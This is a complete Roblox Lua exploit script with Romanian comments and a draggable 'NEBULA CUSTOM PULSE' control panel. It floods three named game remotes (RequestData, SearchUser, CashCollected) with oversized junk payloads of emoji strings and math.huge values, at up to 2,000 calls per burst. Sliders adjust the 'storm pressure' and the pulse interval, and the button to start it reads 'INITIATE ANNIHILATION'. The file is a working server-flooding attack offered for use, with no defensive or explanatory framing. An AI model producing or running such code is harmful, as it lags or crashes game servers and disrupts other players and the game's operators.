local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isActive = false
local pulseMode = false
local power = 400 
local pulseInterval = 5 -- Valoarea implicită pentru secunde

-- ========== REPARARE TARGETE (AUTO-DETECȚIE) ==========
local function GetTargets()
    return {
        ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
        ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
        ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
    }
end

local targets = GetTargets()

-- ========== STATIC PAYLOAD ==========
local STATIC_VOID_PAYLOAD = {}
for i = 1, 10 do
    STATIC_VOID_PAYLOAD[HttpService:GenerateGUID(false):sub(1,6)] = {
        ["Data"] = string.rep("💣", 150),
        ["Math"] = { [i] = math.huge },
        ["Static"] = true
    }
end

-- ========== INTERFAȚĂ GONZO V40 (CU 2 SLIDERE) ==========
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size, Main.Position = UDim2.new(0, 340, 0, 560), UDim2.new(0.5, -170, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(10, 0, 15)
Main.Active = true

local dragStart, startPos, dragging
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
Instance.new("UIStroke", Main).Color = Color3.fromRGB(180, 0, 255)

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text = UDim2.new(1, 0, 0, 50), "NEBULA CUSTOM PULSE"
Title.TextColor3, Title.Font = Color3.fromRGB(220, 100, 255), Enum.Font.GothamBlack
Title.BackgroundTransparency, Title.TextSize = 1, 18

local function CreateSlider(name, pos, minVal, maxVal, default, callback)
    local Label = Instance.new("TextLabel", Main)
    Label.Size, Label.Position = UDim2.new(1, 0, 0, 25), pos
    Label.Text, Label.TextColor3, Label.BackgroundTransparency = name..": "..default, Color3.new(1,1,1), 1
    local Bar = Instance.new("Frame", Main)
    Bar.Size, Bar.Position = UDim2.new(0.8, 0, 0, 4), pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(40, 0, 70)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size, Knob.Position = UDim2.new(0, 16, 0, 16), UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
    Knob.Text = ""
    Instance.new("UICorner", Knob)
    Knob.MouseButton1Down:Connect(function()
        local move; move = RunService.RenderStepped:Connect(function()
            local p = math.clamp((player:GetMouse().X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            local val = math.floor(minVal + (p * (maxVal - minVal)))
            Label.Text = name .. ": " .. val
            callback(val)
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
end

-- Slider 1: Putere
CreateSlider("STORM PRESSURE", UDim2.new(0, 0, 0.15, 0), 1, 2000, 400, function(v) power = v end)

-- Slider 2: Secunde Pulse
CreateSlider("PULSE INTERVAL (SEC)", UDim2.new(0, 0, 0.28, 0), 1, 30, 5, function(v) pulseInterval = v end)

-- Buton de Pulse Mode
local PulseBtn = Instance.new("TextButton", Main)
PulseBtn.Size, PulseBtn.Position = UDim2.new(0.8, 0, 0, 40), UDim2.new(0.1, 0, 0.45, 0)
PulseBtn.Text, PulseBtn.BackgroundColor3 = "PULSE MODE: OFF", Color3.fromRGB(40, 40, 40)
PulseBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", PulseBtn)

PulseBtn.MouseButton1Click:Connect(function()
    pulseMode = not pulseMode
    PulseBtn.Text = pulseMode and "PULSE MODE: ON" or "PULSE MODE: OFF"
    PulseBtn.BackgroundColor3 = pulseMode and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(40, 40, 40)
end)

local ActionBtn = Instance.new("TextButton", Main)
ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 60), UDim2.new(0.1, 0, 0.6, 0)
ActionBtn.Text, ActionBtn.BackgroundColor3 = "INITIATE ANNIHILATION", Color3.fromRGB(100, 0, 200)
ActionBtn.TextColor3, ActionBtn.Font = Color3.new(1, 1, 1), Enum.Font.GothamBlack
Instance.new("UICorner", ActionBtn)

local AbortBtn = Instance.new("TextButton", Main)
AbortBtn.Size, AbortBtn.Position = UDim2.new(0.8, 0, 0, 50), UDim2.new(0.1, 0, 0.8, 0)
AbortBtn.Text, AbortBtn.BackgroundColor3 = "ABORT / CLEANUP", Color3.fromRGB(150, 0, 0)
AbortBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", AbortBtn)

-- ========== MOTOR CU TIMP DINAMIC ==========
ActionBtn.MouseButton1Click:Connect(function()
    if isActive then return end
    isActive = true
    ActionBtn.Text = "STORM ACTIVE..."
    ActionBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
    targets = GetTargets()
    
    task.spawn(function()
        while isActive do
            -- Trimitere rafală
            for i = 1, power do
                if not isActive then break end
                for _, r in pairs(targets) do
                    if r then
                        task.defer(function()
                            if r:IsA("RemoteEvent") then r:FireServer(STATIC_VOID_PAYLOAD)
                            elseif r:IsA("RemoteFunction") then r:InvokeServer(STATIC_VOID_PAYLOAD) end
                        end)
                    end
                end
                -- Zero lag local (lăsăm mișcarea să ruleze la fiecare 100 pachete)
                if i % 100 == 0 then RunService.Stepped:Wait() end
            end
            
            -- Timpul de așteptare se bazează pe Slider-ul secundar
            if pulseMode then
                task.wait(pulseInterval)
            else
                task.wait(0.01)
            end
        end
    end)
end)

AbortBtn.MouseButton1Click:Connect(function()
    isActive = false
    ActionBtn.Text = "INITIATE ANNIHILATION"
    ActionBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 200)
    local char = player.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame
    end
end)
